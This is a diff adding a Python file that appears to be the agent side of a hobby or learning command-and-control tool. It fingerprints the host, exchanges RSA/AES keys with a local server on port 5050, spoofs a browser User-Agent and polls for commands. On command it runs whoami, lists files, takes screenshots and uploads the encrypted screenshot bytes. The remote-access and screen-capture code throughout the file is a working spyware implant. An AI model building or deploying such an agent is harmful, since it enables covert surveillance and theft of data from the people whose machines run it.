@@ -1,0 +1,253 @@
+from paths import DASHBOARD_HTML, SCREENSHOT, OUTPUT_IMG
+from loguru import logger
+import os,time ,base64,pyautogui,requests,threading,socket,getpass,uuid,hashlib,sys
+import OPERATIONS,PROTOCOLS,encryptions
+# ---- end imports ----
+sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "shared"))
+# ---- end path bootstrap ----
+
+#encrypt the aes with the server's public key, and sent it to the server - encrypted
+aes_key = encryptions.aes_key_creation()
+logger.info(f"Successfully created AES key")
+#turn it to int version for RSA exchange
+int_aes_key = int.from_bytes(aes_key, byteorder='little')
+public_key = 0
+N = 0
+
+agent_data = {"agent_id": "" ,"N": "", "public_key": "", "is_encrypted": "False", "ip_adress":"",'aes_key':f'{str(int_aes_key)}'  }
+
+def generate_agent_id():
+    hostname = socket.gethostname()
+    username = getpass.getuser()
+    mac_address = str(uuid.getnode())  # מחזיר את כתובת ה-MAC כמספר שלם
+    # 2. שרשור למחרוזת אחת ארוכה
+    raw_fingerprint = f"{hostname}-{username}-{mac_address}"
+    # 3. העברה דרך פונקציית גיבוב לקבלת מזהה קבוע וייחודי
+    # חייבים לעשות encode כדי להפוך את המחרוזת ל-Bytes לפני הגיבוב
+    agent_hash = hashlib.sha256(raw_fingerprint.encode('utf-8')).hexdigest()
+    # אפשר לחתוך את ה-Hash (שיוצא ארוך) ל-16 תווים כדי שיהיה נוח יותר לעין בלוגים
+    return agent_hash[:16]
+
+
+def decrypt_data_by_server(msg:str, iv:str , aes_key:int):
+    """
+
+    :param msg(str): recieve at base64 code
+    :param iv(str): recieve at base64 code
+    :param aes_key(int): recieve at int (which represent bytes - need to convert)
+    :return:
+    """
+    #input for decryption function should be bytes:
+    decoded64_msg = (encryptions.base_64_decoder(msg))
+    decoded64_iv = (encryptions.base_64_decoder(iv))
+
+    len_aes_key = (aes_key.bit_length()+7//8)
+    bytes_aes_key = (aes_key.to_bytes(16 , 'little'))
+    decrypted_msg_by_server = encryptions.aes_decryption(decoded64_msg,bytes_aes_key,decoded64_iv)
+    unpaded_decrypted_msg_by_server = encryptions.aes_unpadder(decrypted_msg_by_server)
+    if unpaded_decrypted_msg_by_server.startswith(b'\x89\x50\x4E\x47\x0D\x0A\x1A\x0A'):
+        return  unpaded_decrypted_msg_by_server
+    else:
+        return  unpaded_decrypted_msg_by_server.decode('utf-8')
+
+def encrypt_data_by_server(msg:str,aes_key:int)->bytes:
+    iv = encryptions.iv_creator()
+    if type(msg) == str:
+        massage_ived = msg.encode("utf-8")
+    else:
+        massage_ived = msg
+    bytes_aes_key = (aes_key.to_bytes(16, 'little'))
+    padded_msg = encryptions.aes_padder(massage_ived)
+    msg_encrypted = encryptions.aes_encryption(padded_msg, bytes_aes_key, iv)
+    return msg_encrypted, iv
+
+
+def command_handler():
+    while True:
+        if agent_data['is_encrypted'] == 'True':
+            time.sleep(5)
+            server_response = ask_for_commands()
+            print(server_response)
+            #ask_for_commands return a strings which is actually base64 decode
+            msg= server_response['msg']
+            iv = server_response['iv']
+            decrypted_server_response = decrypt_data_by_server(msg,iv,int(agent_data['aes_key']))
+            if decrypted_server_response:
+                #here i have to decrypt p
+                logger.info(decrypted_server_response)
+                if decrypted_server_response == "nothing":
+                    print("no command by server")
+                else:
+                    aes_key = int(agent_data['aes_key'])
+                    match decrypted_server_response:
+                        case "whoami":
+                            user = OPERATIONS.whoami()
+                            aes_key = int(agent_data['aes_key'])
+                            encrypted_content , iv  = encrypt_data_by_server(user, aes_key)
+                            response = send_data_to_server(encrypted_content, iv)
+                            logger.info(response)
+                        case "dir":
+                            cwd = os.getcwd()
+                            files = os.listdir(cwd)
+                            # bytes_list  = pickle.dumps(files)
+                            str_listed = ",".join(files)
+                            encrypted_content , iv  = encrypt_data_by_server(str_listed, aes_key)
+                            response = send_data_to_server(encrypted_content, iv)
+                            logger.info(response)
+                        case "SCREENSHOT":
+                            pyautogui.screenshot(str(SCREENSHOT))
+                            msg = "screenshot successfuly"
+                            encrypted_content, iv = encrypt_data_by_server(msg, aes_key)
+                            response = send_data_to_server(encrypted_content, iv)
+                            logger.info(response)
+                        #------------------------------
+                        case "SEND_IMG":
+                            try:
+                                URL_PIC = str(SCREENSHOT)
+                                with open(URL_PIC, 'rb') as f:
+                                    img_data = f.read()
+                                    logger.info("the img_data has loaded successfuly")
+                                    encrypted_content, iv = encrypt_data_by_server(img_data, aes_key)
+                                    response = send_data_to_server(encrypted_content, iv)
+                                    logger.info(response)
+                            except FileNotFoundError:
+                                print("file not found")
+                                msg = "no image. please use SCREENSHOT before"
+                                encrypted_content, iv = encrypt_data_by_server(msg, aes_key)
+                                response = send_data_to_server(encrypted_content, iv)
+                                logger.info(response)
+                        case _:
+                            encrypted_content, iv = encrypt_data_by_server("Alert: Unknown action received", aes_key)
+                            response = send_data_to_server(encrypted_content, iv)
+                            logger.info(response)
+                        # ------------------------------
+            else:
+                print("no avilable command")
+
+def ask_for_commands():
+            try:
+                custom_headers = {
+                    "Agent-ID": f"{generate_agent_id()}",
+                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"  # בונוס: זיוף דפדפן
+                }
+                response = requests.get('http://127.0.0.1:5050/getcommands', headers=custom_headers)
+
+            except requests.exceptions.ConnectionError:
+                print("Connection Error")
+                return "Connection Error"
+            if response.status_code == 200:
+                print("Success!")
+                print(response.json())
+                return response.json()
+            else:
+                print("problem at encryption - please check!")
+
+
+def send_data_to_server(data_to_send,iv):
+    try:
+        custom_headers = {
+            "Agent-ID": f"{generate_agent_id()}",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+        }
+        int_iv = int.from_bytes(iv,byteorder='little')
+        int_content = int.from_bytes(data_to_send,byteorder='little')
+        base64_content = base64.b64encode(data_to_send).decode('utf-8')
+        data =({"content": base64_content,"iv": str(int_iv)})
+        response = requests.post('http://127.0.0.1:5050/getcommands',json=data,headers=custom_headers)
+
+    except requests.exceptions.ConnectionError:
+        print("Connection Error")
+    if response.status_code == 200:
+        print("Success!")
+        print(response.text)
+        return response.text
+
+#the target of the function is to send a GET commands to the server
+#and ask for the public key, and N - its just return the response - no encryption included.
+def ask_for_keys():
+    try:
+        custom_headers = {
+            "Agent-ID": f"{generate_agent_id()}",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"  # בונוס: זיוף דפדפן
+        }
+        response = requests.get('http://127.0.0.1:5050/getkeys',headers=custom_headers)
+
+    except requests.exceptions.ConnectionError:
+        print("Connection Error")
+        return "Connection Error"
+    if response.status_code == 200:
+        print("Success!")
+        print(response.text)
+        return response.text
+
+def get_encryption_data():
+    while agent_data['is_encrypted'] == 'False':
+        print(f"encryption status is : {agent_data['is_encrypted']}")
+        logger.info("ask for data")
+        data = ask_for_keys()
+        print(f"the specefic thing is {data}")
+        time.sleep(1)
+        print(str(data)[0])
+        if data and data !="empty":
+            #public key start at 1
+            if str(data)[0] == '1':
+                agent_data['public_key'] = str(data)[1:]
+                logger.info(f"public key recived  {agent_data['public_key']}")
+            # n start at 2
+            if str(data[0])=='2':
+                agent_data['N'] = str(data)[1:]
+                logger.info(f"N recived  {agent_data['N']}")
+        elif data =='empty':
+            logger.info("the client should know both N and public_key")
+            logger.info(f"public key is {agent_data['public_key']} and N is {agent_data['N']}")
+
+def check_encryption_status():
+    while True:
+        time.sleep(5)
+        print("check if encryption is good")
+        if  agent_data['N'] and agent_data['public_key'] :
+            logger.info("the encryption is good")
+            x=send_hash_to_server()
+            if x['msg'] == 'success':
+                agent_data['is_encrypted'] = 'True'
+                logger.info("the aes key got by server successfully!")
+                print("the encryption is fine")
+            break
+        else:
+            logger.info("the encryption is not good")
+            agent_data['is_encrypted'] = 'False'
+
+def send_hash_to_server():
+    print(agent_data['public_key'])
+    print(agent_data['N'])
+    aes_encrypted_key = encryptions.encrypt_with_public_key(int(agent_data['public_key']),int(agent_data['N']), int_aes_key)
+    print("the aes key is:")
+    print(aes_encrypted_key)
+    print(type(aes_encrypted_key))
+    try:
+        custom_headers = {
+            "Agent-ID": f"{generate_agent_id()}",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+        }
+
+        data =({"aes_key_int": str(aes_encrypted_key),})
+        response = requests.post('http://127.0.0.1:5050/getkeys',json=data,headers=custom_headers)
+
+    except requests.exceptions.ConnectionError:
+        print("Connection Error")
+    if response.status_code == 200:
+        print("Success!")
+        print(response.text)
+        return response.json()
+
+t1 = threading.Thread(target= get_encryption_data, args=())
+t2 = threading.Thread(target= check_encryption_status, args=())
+t3= threading.Thread(target=command_handler , args=())
+t2.start()
+t1.start()
+t2.join()
+t3.start()
+
+
+
+
